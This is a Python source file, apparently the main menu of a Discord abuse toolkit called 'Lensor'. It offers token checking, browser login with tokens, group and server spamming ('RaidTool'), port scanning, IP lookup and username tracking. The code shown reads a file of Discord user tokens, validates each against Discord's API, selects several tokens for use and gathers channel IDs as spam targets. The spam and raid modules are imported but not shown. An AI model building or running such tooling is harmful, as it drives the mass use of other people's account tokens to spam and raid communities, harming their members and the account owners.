import fade
import os
from datetime import datetime, timezone
import time
import colorama
import requests, random, subprocess, threading
from selenium import webdriver
import sys
from bs4 import BeautifulSoup
import socket
import concurrent.futures
from pystyle import Colors, Colorate
import ipaddress
from ping3 import ping
import threading
from colorama import Fore, Style

TokensPath = "C:\\Users\\krens\\Desktop\\LensorTool\\TokenDisc.txt"


end = "\033[0m"
purple = "\033[1;35m"
red = "\033[0;31m"
green = "\033[0;32m"
white  = "\033[37m"
reset = Style.RESET_ALL




options = {
    1: "Tokens Info Check",
    2: "Server Info Check ",
    3: "Token Browser Open",
    4: "Token Checker",
    5: "Token Joiner (Not Work)",
    6: "Group Spammer",
    7: "Server Spammer",
    8: "Token Clear DM",
    9: "Token Clear Servers",
    10: "Test option",
    11: "Test option",
    12: "Test option",
    13: "Test option",
    14: "Test option",
    16: "Ip Port Scanner",
    17: "Ip Pinger",
    18: "Ip Lookup",
    19: "Test option",
    20: "Test option",
    21: "Test option",
    22: "Username Tracker",
    15: "Clear",
}


def banner():
	os.system('cls||clear')
	Slow(fade.pinkred(f'''
		                                                       :                
		                      ,;L.                      .     t#,               
		             i      f#i EW:        ,ft         ;W    ;##W.   j.         
		            LE    .E#t  E##;       t#E        f#E   :#L:WE   EW,        
		           L#E   i#W,   E###t      t#E      .E#f   .KG  ,#D  E##j       
		          G#W.  L#D.    E#fE#f     t#E     iWW;    EE    ;#f E###D.     
		         D#K. :K#Wfff;  E#t D#G    t#E    L##Lffi f#.     t#iE#jG#W;    
		        E#K.  i##WLLLLt E#t  f#E.  t#E   tLLG##L  :#G     GK E#t t##f   
		      .E#E.    .E#L     E#t   t#K: t#E     ,W#i    ;#L   LW. E#t  :K#E: 
		     .K#E        f#E:   E#t    ;#W,t#E    j#E.      t#f f#:  E#KDDDD###i
		    .K#D          ,WW;  E#t     :K#D#E  .D#j         f#D#;   E#f,t#Wi,,,
		   .W#G            .D#; E#t      .E##E ,WK,           G#t    E#t  ;#W:  
		  :W##########Wt     tt ..         G#E EG.             t     DWi   ,KK: 
		  :,,,,,,,,,,,,,.                   fE ,                                
		                                     ,                                                 
                                 {colored_red_purple("""Discord Tools                                Other Tools 
                               └───────────────┘                            └─────────────┘""")}				
         {colored_red_purple("[ 1 ] ~ ")}{white}{options[1]}          {colored_red_purple("[ 8 ] ~ ")}{white}{options[8]}        {colored_red_purple("[ 16 ] ~ ")}{white}{options[16]}
         {colored_red_purple("[ 2 ] ~ ")}{white}{options[2]}         {colored_red_purple("[ 9 ] ~ ")}{white}{options[9]}   {colored_red_purple("[ 17 ] ~ ")}{white}{options[17]}
         {colored_red_purple("[ 3 ] ~ ")}{white}{options[3]}         {colored_red_purple("[ 10 ] ~ ")}{white}{options[10]}          {colored_red_purple("[ 18 ] ~ ")}{white}{options[18]}	
         {colored_red_purple("[ 4 ] ~ ")}{white}{options[4]}              {colored_red_purple("[ 11 ] ~ ")}{white}{options[11]}          {colored_red_purple("[ 19 ] ~ ")}{white}{options[19]}	
         {colored_red_purple("[ 5 ] ~ ")}{white}{options[5]}    {colored_red_purple("[ 12 ] ~ ")}{white}{options[12]}          {colored_red_purple("[ 20 ] ~ ")}{white}{options[20]}	
         {colored_red_purple("[ 6 ] ~ ")}{white}{options[6]}              {colored_red_purple("[ 13 ] ~ ")}{white}{options[13]}          {colored_red_purple("[ 21 ] ~ ")}{white}{options[21]}
         {colored_red_purple("[ 7 ] ~ ")}{white}{options[7]}             {colored_red_purple("[ 14 ] ~ ")}{white}{options[14]}          {colored_red_purple("[ 22 ] ~ ")}{white}{options[22]}
       {colored_red_purple(f"""└──────────────────────────────────────┬─────────────────┬──────────────────────────────────────┘
                                              │  [ 15 ] ~ {options[15]} │
                                              └─               ─┘""")}
'''))










def main():
    choice=input(f"{now_time()}~ Lensor$v0.1 ~ {purple}[ {end}> {purple}]  {end}" )

    if choice == '1':
        from Utils.tokeninfo import tokeninfo
        tokeninfo()
    elif choice == '2':
        from Utils.serverinfo import serverinfo
        serverinfo()
    elif choice == '3':
        from Utils.opentokenweb import tokenopen
        tokenopen()

    elif choice == '4':
        TokenChecker()
    elif choice == '5':
        from Utils.joiner import Joiner
        Joiner()
    elif choice == '6':
        from Utils.GroupSpammer import groupspammer
        groupspammer()
    elif choice == '7':
        from Utils.RaidTool import raidtool
        raidtool()

    elif choice == '8':
        print(f"This tool is under development, so it is not yet usable.")
        main()

    elif choice == '9':
        print(f"This tool is under development, so it is not yet usable.")
        main()
    elif choice == '10':
        print(f"This tool is under development, so it is not yet usable.")
        main()
    elif choice == '11':
        print(f"This tool is under development, so it is not yet usable.")
        main()
    elif choice == '12':
        print(f"This tool is under development, so it is not yet usable.")
        main()
    elif choice == '13':
        print(f"This tool is under development, so it is not yet usable.")
        main()
    elif choice == '14':
        print(f"This tool is under development, so it is not yet usable.")
        main()
    elif choice == '16':
        from Utils.portscanner import port_scanner_func
        port_scanner_func()
    elif choice == '17':
        from Utils.ipping import ip_ping
        ip_ping()
    elif choice == '18':
        from Utils.iplookup import iplookup
        iplookup()
    elif choice == '19':
        print(f"This tool is under development, so it is not yet usable.")
        main()
    elif choice == '20':
        print(f"This tool is under development, so it is not yet usable.")
        main()
    elif choice == '21':
        print(f"This tool is under development, so it is not yet usable.")
        main()
    elif choice == '22':
        from Utils.usertracker import usernametracker
        usernametracker()
    elif choice == '15':
        banner()
        main()
    elif choice == 'clear':
        banner()
        main()
    else: 
        print(f"There is no such command.")
        main()




def Slow(texte):
    delai = 0.02
    lignes = texte.split('\n')
    for ligne in lignes:
        print(ligne)
        time.sleep(delai)








def now_time():
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    return (f"{purple}[ {end}{current_time} {purple}] {end}")






def colored_red_purple(text):
    return Colorate.Horizontal(Colors.red_to_purple, f"{text}", 1)

def colored_green(text):
    return Colorate.Horizontal(Colors.green_to_cyan, f"{text}", 1)

def colored_yellow(text):
    return Colorate.Horizontal(Colors.red_to_yellow, f"{text}", 1)




def TokenChecker():
    def CheckToken(token_number, token):
        response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        
        if response.status_code == 200:
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            username_discord = user['username']
            token_sensur = token[:-25] + '.' * 3
            print(colored_green(f" {token_number} -> Status: Valid | User: {username_discord} | Token: {token_sensur}"))
        else:
            print(colored_red_purple(f" {token_number} -> Status: Invalid | Token: {token}"))

    file_token_discord_relative = f"{TokensPath}"
    file_token_discord = os.path.join(f"{TokensPath}")

    tokens = {}
    token_discord_number = 0

    with open(file_token_discord, 'r') as file_token:
        print(colored_yellow(f"Token Discord Path: {file_token_discord_relative}\n"))
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
    
            token_discord_number += 1
            modified_token = line.strip()
            tokens[token_discord_number] = modified_token
            CheckToken(token_discord_number, modified_token)

    main()






def Choice1TokenDiscord():
    def CheckToken(token_number, token):
        response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        
        if response.status_code == 200:
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            username_discord = user['username']
            token_sensur = token[:-25] + '.' * 3
            print(colored_green(f" {token_number} -> Status: Valid | User: {username_discord} | Token: {token_sensur}"))
        else:
            print(colored_red_purple(f" {token_number} -> Status: Invalid | Token: {token}"))

    file_token_discord_relative = f"{TokensPath}"
    file_token_discord = os.path.join(f"{TokensPath}")

    tokens = {}
    token_discord_number = 0

    with open(file_token_discord, 'r') as file_token:
        print(colored_yellow(f"Token Discord Path: {file_token_discord_relative}\n"))
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
    
            token_discord_number += 1
            modified_token = line.strip()
            tokens[token_discord_number] = modified_token
            CheckToken(token_discord_number, modified_token)

    if not tokens:
        print(colored_red_purple(f"No Token Discord in file: {file_token_discord_relative} Please add tokens to the file."))

        return None

    try:
        selected_token_number = int(input(f"{now_time()}~ Token Number ~ {purple}[ {end}> {purple}]  {end}"))
    except:
        print("error")

    selected_token = tokens.get(selected_token_number)
    if selected_token:
        r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': selected_token, 'Content-Type': 'application/json'})
        if r.status_code == 200:
            pass
        else:
            print("error")
    else:
        print("error")
    return selected_token






def ChoiceMultiChannelDiscord():
    try:
        num_channels = int(input(f"{now_time()}~ How many spam channels ~ {purple}[ {end}> {purple}]  {end}"))
    except:
        print("error")
    
    selected_channels = [] 
    number = 0
    for _ in range(num_channels):
        try:
            number += 1
            selected_channel_number = input(f"{now_time()}~ Channel Id {number}/{num_channels} ~ {purple}[ {end}> {purple}]  {end}")
            selected_channels.append(selected_channel_number)
        except:
            print("error id")

    return selected_channels














def ChoiceMultiTokenDisord():
    def CheckToken(token_number, token):
        response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        
        if response.status_code == 200:
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            username_discord = user['username']
            token_sensur = token[:-25] + '.' * 3
            print(colored_green(f" {token_number} -> Status: Valid | User: {username_discord} | Token: {token_sensur}"))
        else:
            print(colored_red_purple(f" {token_number} -> Status: Invalid | Token: {token}"))

    file_token_discord_relative = f"{TokensPath}"
    file_token_discord = os.path.join(f"{TokensPath}")
    tokens = {}
    token_discord_number = 0

    with open(file_token_discord, 'r') as file_token:
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
            token_discord_number += 1
        
        if token_discord_number == 0:
            print(colored_yellow(f"No Token Discord in file: {file_token_discord_relative} Please add tokens to the file."))
            
            
        else:
            print(colored_green(f"{token_discord_number} Token Discord found ({file_token_discord_relative})"))
    
    try:
        num_tokens = int(input(f"{now_time()}~ How many token (max {token_discord_number}) ~ {purple}[ {end}> {purple}]  {end}"))
        if num_tokens > token_discord_number:
            print("error")
    except:
        print("error")

    token_discord_number = 0
    with open(file_token_discord, 'r') as file_token:
        print()
        print(colored_yellow(f"Token Discord ({file_token_discord}):\n"))
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
            
            token_discord_number += 1
            modified_token = line.strip()
            tokens[token_discord_number] = modified_token
            CheckToken(token_discord_number, modified_token)

    number = 0
    selected_tokens = []
    selected_token_number = 0  # Инициализация переменной

    for _ in range(num_tokens):
        number += 1
        selected_token_number += 1  # Увеличиваем номер токена

        # Получаем токен из словаря
        selected_token = tokens.get(selected_token_number)

        if selected_token:
            selected_tokens.append(selected_token)
        else:
            print(f"Error: token with number {selected_token_number} not found")

    return selected_tokens





